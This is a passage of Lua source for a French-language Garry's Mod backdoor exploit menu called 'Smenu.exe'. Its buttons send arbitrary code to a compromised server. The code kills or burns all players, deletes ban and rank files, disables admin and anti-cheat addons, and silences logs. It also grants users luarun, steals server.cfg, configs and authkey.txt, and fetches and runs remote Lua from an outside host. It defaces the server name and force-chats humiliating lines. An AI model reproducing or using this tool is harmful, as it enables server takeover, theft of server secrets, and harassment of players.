surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Hurlement activé !" )
    SploitNotify("Hurlement activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Change map gm_construct" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_construct\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Map changé à GM_CONSTRUCT" )
    SploitNotify("Map changé à GM_CONSTRUCT")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Supprimer les grades" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Grades supprimés" )
    SploitNotify("Grades supprimés.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Bruler tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde brûle" )
    SploitNotify("Tout le monde brule !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 330 )
Macro:SetText( "Deban tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde est debanni" )
    SploitNotify("Plus personne n'est banni.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 360 )
Macro:SetText( "Tuer tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde est mort" )
    SploitNotify("Tout le monde est mort !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 390 )
Macro:SetText( "Brook ULX CAC" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( " _G.cac = function() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Cac Brooked !" )
    SploitNotify("Cac Brooked !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 420 )
Macro:SetText( "Brook ULX/ULIB" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( " _G.ulx = function() end _G.ULib = function() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "ULX/ULIB Brooked !" )
    SploitNotify("ULX/ULIB Brooked !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 450 )
Macro:SetText( "Brook Fadmin" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
			_G.FAdmin = function() end
]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Fadmin Brooked !" )
    SploitNotify("Fadmin Brooked !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 480 )
Macro:SetText( "Voler les fichier" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
		util.AddNetworkString("FUCKYOULOLOLOLOLOL")
		#M:SendLua([=[net.Receive("FUCKYOULOLOLOLOLOL", function()
							local a, b = net.ReadString(), net.ReadString()
								if (b == "DIR") then file.CreateDir("SmenuStealDATA/"..a) return end
								file.Write("SmenuStealDATA/"..a..".txt", b)
							end)]=])

							local function SendFile( f )
								local content = file.Read(f, "GAME") or "NO DATA"
								net.Start("FUCKYOULOLOLOLOLOL")
								net.WriteString(f)
								net.WriteString(content)
								net.Send(#M)
								#M:ChatPrint("Sent: "..f)
							end
							local function SendDir( d )
								net.Start("FUCKYOULOLOLOLOLOL")
								net.WriteString(d)
								net.WriteString("DIR")
								net.Send(#M)
							end
							timer.Simple(0.1, function()
								SendDir("cfg")
								SendDir("data")
								SendDir("data/ulx")
								SendDir("data/ulib")
								SendFile("cfg/server.cfg")
								SendFile("cfg/autoexec.cfg")
								SendFile("data/ulx/config.txt")
								SendFile("data/ulib/groups.txt")
								SendFile("authkey.txt")
							end)

]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Voler les fichier en cours, go Garry's Mod/garrysmod/data/SmenuStealDATA." )
    SploitNotify("Voler les fichier")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 510 )
Macro:SetText( "PornHub Everyone" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString ( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(1920,1080) hud:SetPos(0,0) hud:OpenURL(\"https://loadingscrren.000webhostapp.com/finihacked.jpg\")]]) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tu as mis PornHub sur les ecrans LOL." )
    SploitNotify("Tu as mis PornHub sur les ecrans LOL.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 540 )
Macro:SetText( "Strip Les Joueurs" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
removeAll()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tu as enlever les armes des joueurs." )
    SploitNotify("Tu as enlever les armes des joueurs.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 570 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Les Joueurs En Escargots" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"100\")" )
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "C'est LEEEEEEEEEEEEEEEENT !" )
    SploitNotify("C'est LEEEEEEEEEEEEEEEENT !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Grosse tête" ) 
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde à une grosse tête :)" )
	    SploitNotify("Tout le monde à une grosse tête")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 60 )
Macro:SetText( "STOP 2D player" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "2D player désactivé !" )
	    SploitNotify("2D player désactivé !")
    surface.PlaySound("buttons/blip1.wav") 
		net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(1,1,1))
        v:ManipulateBoneScale( b, Vector(1,1,1))
        v:ManipulateBoneScale( c, Vector(1,1,1))
        v:ManipulateBoneScale( d, Vector(1,1,1))
        v:ManipulateBoneScale( e, Vector(1,1,1))
        v:ManipulateBoneScale( f, Vector(1,1,1))
        v:ManipulateBoneScale( g, Vector(1,1,1))
        v:ManipulateBoneScale( h, Vector(1,1,1))
        v:ManipulateBoneScale( i, Vector(1,1,1))
        v:ManipulateBoneScale( j, Vector(1,1,1))
        v:ManipulateBoneScale( k, Vector(1,1,1))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 	

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 90 )
Macro:SetText( "M9K Nuke" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Une nuke va exploser quelques part ! :o" )
    SploitNotify("Une nuke va exploser ! (m9k requis)")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[
local rocket = ents.Create("m9k_launched_davycrockett")
local ply2 = table.Random(player.GetAll())
if ply2 == ply then ply:ChatPrint("[RunString] Prevented epicentre from being you.") else
    rocket:SetPos(ply2:GetPos())
    rocket:SetOwner(ply2)
    rocket.Owner = ply2
    rocket:Spawn()
    rocket:Activate()
ply:ChatPrint("[RunString] Allahu akbar.")  
end]])			
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 120 )
Macro:SetText( "Hostname" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Nom du serv : SEIZED BY SPARKS TeamSmenu.exe" )
    SploitNotify("Nom du serv changer à SEIZED ")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", \"SEIZED BY SPARKS https://discord.gg/zgH3v3\")")		
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 150 )
Macro:SetText( "Forcer a dire une chose" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'i love Sparks and Lenny!' " )
    SploitNotify("Tout le monde est en love sur Sparks!")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say i love Sparks <3")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 180 )
Macro:SetText( "Force retry all" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde se déco/reco ! " )
    SploitNotify("Déco/reco de tous les joueurs")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("retry")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 210 )
Macro:SetText( "Force say : J'ai un petit zizi" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'j'ai un petit zizi <3)'" )
    SploitNotify("Tout le monde dit 'j'ai un petit zizi <3")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say j'ai un tout petit zizi")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 240 )
Macro:SetText( "Luarun en user" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Luarun en user OK." )
    SploitNotify("Luarun set en user !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 500, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Force change name" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://loadingscrren.000webhostapp.com/force_change_name.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Tout le monde change de nom :')" )
	    SploitNotify("Tout le monde change de nom :')")
    surface.PlaySound("buttons/blip1.wav") 
        net.WriteBit(1)
        net.SendToServer()
end  


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 270 )
Macro:SetText( "ULX LOGECHO 0" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "ULX LOGECHO 0" )
    SploitNotify("ULX LOGECHO 0")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"logecho\", \"0\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 300 )
Macro:SetText( "Danse" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Danse" )
    SploitNotify("Danse")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end timer.Create("dance_loop",2.3,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end end )
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 330 )
Macro:SetText( "+right" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "+right" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+right")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 360 )
Macro:SetText( "+duck" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "+duck" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+duck")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 390 )
Macro:SetText( "+back" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+back")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 420 )
Macro:SetText( "+forward" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 450 )
Macro:SetText( "Give superadmin" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
